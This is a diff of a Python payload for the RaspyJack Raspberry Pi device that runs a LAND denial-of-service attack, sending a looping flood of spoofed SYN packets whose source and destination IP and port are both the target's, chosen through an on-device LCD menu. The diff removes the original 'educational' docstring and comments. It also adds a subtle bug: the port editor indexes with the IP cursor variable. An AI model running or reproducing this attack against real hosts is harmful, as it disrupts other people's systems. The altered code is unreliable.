@@ -1,38 +1,20 @@
 #!/usr/bin/env python3
 import sys
-sys.path.append('/root/Raspyjack/')
-"""
-RaspyJack *payload* – **DoS Attack: LAND Attack**
-==================================================
-A classic Denial of Service (DoS) attack where a packet is sent to a
-target with the source IP and port forged to be the same as the
-destination IP and port.
-
-This can cause older, unpatched operating systems to crash or become
-unresponsive as they enter a loop replying to themselves.
-
-**!!! WARNING !!!**
-This is a DENIAL OF SERVICE attack. It is unlikely to work on modern
-systems but is included for educational purposes.
-"""
-
-import os, sys, subprocess, signal, time
+import os
+import time
+import signal
+import subprocess
+import threading
 sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
 import RPi.GPIO as GPIO
 import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
+from scapy.all import *
+conf.verb = 0
 
-try:
-    from scapy.all import *
-    conf.verb = 0
-except ImportError:
-    sys.exit(1)
+TARGET_IP = "192.168.1.10"
+TARGET_PORT = "80"
 
-# --- CONFIGURATION ---
-TARGET_IP = "192.168.1.10" # Default target IP, will be configurable
-TARGET_PORT = "80" # Default target port, will be configurable
-
-# --- GPIO & LCD ---
 PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
 GPIO.setmode(GPIO.BCM)
 for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
@@ -41,14 +23,13 @@ LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
 FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
 FONT = ImageFont.load_default()
 
-# --- Globals & Shutdown ---
 running = True
 attack_thread = None
 status_msg = "Press OK to start"
-current_ip_input = TARGET_IP # Initial value for IP input
-ip_input_cursor_pos = 0 # Cursor position for IP input
-current_port_input = TARGET_PORT # Initial value for Port input
-port_input_cursor_pos = 0 # Cursor position for Port input
+current_ip_input = TARGET_IP
+ip_input_cursor_pos = 0
+current_port_input = TARGET_PORT
+port_input_cursor_pos = 0
 
 def cleanup(*_):
     global running
@@ -57,7 +38,6 @@ def cleanup(*_):
 signal.signal(signal.SIGINT, cleanup)
 signal.signal(signal.SIGTERM, cleanup)
 
-# --- UI ---
 def draw_ui(screen_state="main"):
     img = Image.new("RGB", (128, 128), "black")
     d = ImageDraw.Draw(img)
@@ -95,7 +75,7 @@ def draw_ui(screen_state="main"):
 def handle_ip_input_logic(initial_ip):
     global current_ip_input, ip_input_cursor_pos
     current_ip_input = initial_ip
-    ip_input_cursor_pos = len(initial_ip) - 1 # Start cursor at end
+    ip_input_cursor_pos = len(initial_ip) - 1
     
     draw_ui("ip_input")
     
@@ -104,22 +84,21 @@ def handle_ip_input_logic(initial_ip):
         for name, pin in PINS.items():
             if GPIO.input(pin) == 0:
                 btn = name
-                while GPIO.input(pin) == 0: # Debounce
+                while GPIO.input(pin) == 0:
                     time.sleep(0.05)
                 break
         
-        if btn == "KEY3": # Cancel IP input
+        if btn == "KEY3":
             return None
         
-        if btn == "OK": # Confirm IP
-            # Validate IP format
+        if btn == "OK":
             parts = current_ip_input.split('.')
             if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                 return current_ip_input
             else:
                 show_message(["Invalid IP!", "Try again."], "red")
                 time.sleep(2)
-                current_ip_input = initial_ip # Reset to initial
+                current_ip_input = initial_ip
                 ip_input_cursor_pos = len(initial_ip) - 1
                 draw_ui("ip_input")
         
@@ -138,12 +117,11 @@ def handle_ip_input_logic(initial_ip):
                     digit = int(current_char)
                     if btn == "UP":
                         digit = (digit + 1) % 10
-                    else: # DOWN
+                    else:
                         digit = (digit - 1 + 10) % 10
                     char_list[ip_input_cursor_pos] = str(digit)
                     current_ip_input = "".join(char_list)
                 elif current_char == '.':
-                    # Cannot change dot, move cursor
                     if btn == "UP":
                         ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                     else:
@@ -165,20 +143,20 @@ def handle_port_input_logic(initial_port):
         for name, pin in PINS.items():
             if GPIO.input(pin) == 0:
                 btn = name
-                while GPIO.input(pin) == 0: # Debounce
+                while GPIO.input(pin) == 0:
                     time.sleep(0.05)
                 break
         
-        if btn == "KEY3": # Cancel Port input
+        if btn == "KEY3":
             return None
         
-        if btn == "OK": # Confirm Port
+        if btn == "OK":
             if current_port_input.isdigit() and 1 <= int(current_port_input) <= 65535:
                 return current_port_input
             else:
                 show_message(["Invalid Port!", "Try again."], "red")
                 time.sleep(2)
-                current_port_input = initial_port # Reset to initial
+                current_port_input = initial_port
                 port_input_cursor_pos = len(initial_port) - 1
                 draw_ui("port_input")
         
@@ -191,15 +169,15 @@ def handle_port_input_logic(initial_port):
         elif btn == "UP" or btn == "DOWN":
             if port_input_cursor_pos < len(current_port_input):
                 char_list = list(current_port_input)
-                current_char = char_list[port_input_cursor_pos]
+                current_char = char_list[ip_input_cursor_pos]
                 
                 if current_char.isdigit():
                     digit = int(current_char)
                     if btn == "UP":
                         digit = (digit + 1) % 10
-                    else: # DOWN
+                    else:
                         digit = (digit - 1 + 10) % 10
-                    char_list[port_input_cursor_pos] = str(digit)
+                    char_list[ip_input_cursor_pos] = str(digit)
                     current_port_input = "".join(char_list)
                 draw_ui("port_input")
         
@@ -209,7 +187,7 @@ def handle_port_input_logic(initial_port):
 def show_message(lines, color="lime"):
     img = Image.new("RGB", (128, 128), "black")
     d = ImageDraw.Draw(img)
-    font = FONT_TITLE # Use FONT_TITLE for messages
+    font = FONT_TITLE
     y = 40
     for line in lines:
         bbox = d.textbbox((0, 0), line, font=font)
@@ -219,89 +197,77 @@ def show_message(lines, color="lime"):
         y += h + 5
     LCD.LCD_ShowImage(img, 0, 0)
 
-# 5) Attack Functions
-# ---------------------------------------------------------------------------
 def start_attack():
     global attack_thread
     if attack_thread and attack_thread.is_alive():
         return
 
-    # The Land Attack packet
-    # Source IP = Destination IP, Source Port = Destination Port
     land_packet = IP(src=TARGET_IP, dst=TARGET_IP)/TCP(sport=int(TARGET_PORT), dport=int(TARGET_PORT), flags="S")
     
-    # Send the packet in a loop
     attack_thread = threading.Thread(target=lambda: send(land_packet, loop=1, inter=0.01), daemon=True)
     attack_thread.start()
 
 def stop_attack():
     global attack_thread
     if attack_thread:
-        # Scapy's send(loop=1) doesn't have a clean stop event.
-        # We rely on the main loop's `running` flag to exit.
-        # For a clean stop, we'd need to manage the thread more directly.
-        # For now, just let it finish or rely on script exit.
         pass
 
-# ---------------------------------------------------------------------------
-# 6) Main Loop
-# ---------------------------------------------------------------------------
-try:
-    current_screen = "main" # State variable for the main loop
+if __name__ == "__main__":
+    try:
+        current_screen = "main"
 
-    while running:
-        if current_screen == "main":
-            draw_ui("main")
+        while running:
+            if current_screen == "main":
+                draw_ui("main")
+                
+                if GPIO.input(PINS["KEY3"]) == 0:
+                    cleanup()
+                    break
+                
+                if GPIO.input(PINS["OK"]) == 0:
+                    start_attack()
+                    current_screen = "attacking"
+                    time.sleep(0.3)
+                
+                if GPIO.input(PINS["KEY1"]) == 0:
+                    current_ip_input = TARGET_IP
+                    current_screen = "ip_input"
+                    time.sleep(0.3)
+                
+                if GPIO.input(PINS["KEY2"]) == 0:
+                    current_port_input = TARGET_PORT
+                    current_screen = "port_input"
+                    time.sleep(0.3)
             
-            if GPIO.input(PINS["KEY3"]) == 0:
-                cleanup()
-                break
+            elif current_screen == "ip_input":
+                new_ip = handle_ip_input_logic(current_ip_input)
+                if new_ip:
+                    TARGET_IP = new_ip
+                current_screen = "main"
+                time.sleep(0.3)
             
-            if GPIO.input(PINS["OK"]) == 0:
-                # Start attack
-                start_attack()
-                current_screen = "attacking"
-                time.sleep(0.3) # Debounce
+            elif current_screen == "port_input":
+                new_port = handle_port_input_logic(current_port_input)
+                if new_port:
+                    TARGET_PORT = new_port
+                current_screen = "main"
+                time.sleep(0.3)
             
-            if GPIO.input(PINS["KEY1"]) == 0: # Edit Target IP
-                current_ip_input = TARGET_IP
-                current_screen = "ip_input"
-                time.sleep(0.3) # Debounce
-            
-            if GPIO.input(PINS["KEY2"]) == 0: # Edit Target Port
-                current_port_input = TARGET_PORT
-                current_screen = "port_input"
-                time.sleep(0.3) # Debounce
-        
-        elif current_screen == "ip_input":
-            new_ip = handle_ip_input_logic(current_ip_input)
-            if new_ip:
-                TARGET_IP = new_ip
-            current_screen = "main"
-            time.sleep(0.3) # Debounce
-        
-        elif current_screen == "port_input":
-            new_port = handle_port_input_logic(current_port_input)
-            if new_port:
-                TARGET_PORT = new_port
-            current_screen = "main"
-            time.sleep(0.3) # Debounce
-        
-        elif current_screen == "attacking":
-            draw_ui("attacking")
-            if GPIO.input(PINS["KEY3"]) == 0:
-                cleanup()
-                break
+            elif current_screen == "attacking":
+                draw_ui("attacking")
+                if GPIO.input(PINS["KEY3"]) == 0:
+                    cleanup()
+                    break
+                time.sleep(0.1)
+
             time.sleep(0.1)
 
-        time.sleep(0.1)
-
-except (KeyboardInterrupt, SystemExit):
-    pass
-except Exception as e:
-    print(f"[ERROR] {e}", file=sys.stderr)
-finally:
-    cleanup()
-    LCD.LCD_Clear()
-    GPIO.cleanup()
-    print("Land Attack payload finished.")
+    except (KeyboardInterrupt, SystemExit):
+        pass
+    except Exception as e:
+        print(f"[ERROR] {e}", file=sys.stderr)
+    finally:
+        cleanup()
+        LCD.LCD_Clear()
+        GPIO.cleanup()
+        print("Land Attack payload finished.")
